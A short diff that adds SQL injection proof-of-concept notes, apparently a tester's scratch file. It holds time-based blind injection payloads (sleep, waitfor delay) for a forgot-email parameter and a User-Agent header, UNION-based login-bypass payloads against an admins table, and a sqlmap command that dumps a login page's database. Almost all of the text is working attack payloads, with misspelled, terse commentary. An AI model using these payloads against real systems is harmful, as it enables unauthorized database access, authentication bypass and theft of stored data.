@@ -1,0 +1,21 @@
+poc 1:
+found sql in forget email parameter with sleep commend
+in repeter the time taken with payload was 290min and lets 
+check with payload '%2b(select*from(select(sleep(20)))a)%2b' 
+payload 2 for blind sql injection
+"0' Xor(if(now()=sysdate(),sleep(20),0))xor'z"
+
+poc2:
+parameter was user agenta :
+payload was : ',0)waitfor delay'0:0:10' -- 
+id=1 AND 1339=1339
+id=1 AND (SELECT 4353 FROM (SELECT(SLEEP(5)))GZGQ)
+
+
+poc 3:
+username=admin’ UNION SELECT ‘PlayerX’ AS password FROM admins WHERE ‘1’ = ‘1
+admin' UNION SELECT 'playerz' AS password FROM admins WHERE '1'='1
+
+password=PlayerX
+poc 4:
+ sqlmap -r sqltest.txt --dump  ==> sqktest.txt means post page of login
